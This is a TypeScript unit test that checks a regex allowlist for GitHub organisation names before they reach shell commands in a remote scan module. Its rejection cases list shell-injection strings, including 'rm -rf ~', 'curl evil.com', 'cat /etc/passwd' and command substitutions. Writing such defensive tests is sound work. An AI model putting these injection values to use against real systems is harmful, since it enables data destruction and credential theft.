/**
 * Closes #473 — regression guard for org-name allowlist in
 * registry-oracle-scan-remote.ts.
 *
 * Unit-tests the ORG_NAME_RE pattern directly. The full scanRemote
 * flow isn't exercised (requires network + gh auth) — this guards
 * the shell-safety at the allowlist seam.
 */
import { describe, it, expect } from "bun:test";

// Mirror of the pattern in src/core/fleet/registry-oracle-scan-remote.ts.
// Keep in sync — if the module's pattern changes, update this and the
// corresponding test cases.
const ORG_NAME_RE = /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,37}[a-zA-Z0-9])?$/;

describe("org name allowlist (#473)", () => {
  describe("accepts real GitHub org names", () => {
    const good = [
      "Soul-Brews-Studio",
      "laris-co",
      "nazt",
      "github",
      "a",
      "a1",
      "A-B-C",
      "x1234567890",
    ];
    for (const org of good) {
      it(`accepts "${org}"`, () => {
        expect(ORG_NAME_RE.test(org)).toBe(true);
      });
    }
  });

  describe("rejects shell-injection attempts", () => {
    const bad = [
      'laris-co"; rm -rf ~; echo "',
      "laris-co && curl evil.com",
      "laris-co | cat /etc/passwd",
      "laris-co$(whoami)",
      "laris-co`id`",
      "-laris", // leading dash
      "laris-", // trailing dash
      "laris co", // space
      "laris;rm", // semicolon
      "laris\nrm", // newline
      "", // empty
      "a".repeat(41), // length boundary
    ];
    for (const org of bad) {
      it(`rejects ${JSON.stringify(org)}`, () => {
        expect(ORG_NAME_RE.test(org)).toBe(false);
      });
    }
  });

  describe("length boundary", () => {
    it("accepts 39-char org (GitHub max)", () => {
      const maxLen = "a" + "1".repeat(37) + "z"; // 39 chars
      expect(maxLen.length).toBe(39);
      expect(ORG_NAME_RE.test(maxLen)).toBe(true);
    });
    it("rejects 40-char org", () => {
      const over = "a" + "1".repeat(38) + "z"; // 40 chars
      expect(over.length).toBe(40);
      expect(ORG_NAME_RE.test(over)).toBe(false);
    });
  });
});
